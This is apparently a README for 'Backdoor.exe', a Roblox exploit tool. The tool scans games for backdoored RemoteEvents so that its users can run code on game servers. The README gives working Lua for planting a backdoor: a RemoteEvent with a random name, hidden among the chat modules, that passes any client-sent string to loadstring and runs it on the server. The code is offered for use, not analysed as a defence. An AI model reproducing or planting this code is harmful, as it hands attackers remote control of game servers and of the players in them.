# Backdoor.exe
The best backdoor scanner there is. Our [Discord Server](https://discord.com/invite/6HndYgC).
YOU ARE NOT ALLOWED TO RESELL IT
## Credits
* iK4oS
* Bubba
* Redcarred2
* eeee

## Information
Backdoor.exe is script that scans for open backdoors in games in [Roblox](https://roblox.com/ "Roblox"). It does this by itterating through every Remote Event and firing a script of of them that creates an object. The scripts checks if the object is created, sees what Remote Event caused that to be created and stores it.

### Opening a backdoor
Get access to a game in Roblox Studio, create a script and paste the few lines of code below in the script.
```lua
local Remote = Instance.new("RemoteEvent", game.Chat:WaitForChild("ClientChatModules").MessageCreatorModules)
Remote.Name = tostring(math.random(100000000,1000000000))
Remote.OnServerEvent:connect(function(player, execute)
	loadstring(execute)()
end)
```

## To-do List
* [ ] Pop Up Logo
* [ ] Settings
* [ ] Account Info
* [ ] Server Lock
* [ ] Remote Search
* [ ] Save Backdoor

![Backdoor.exe](https://i.gyazo.com/76f9aeb40f6218a172f9988e46c9faaa.png)
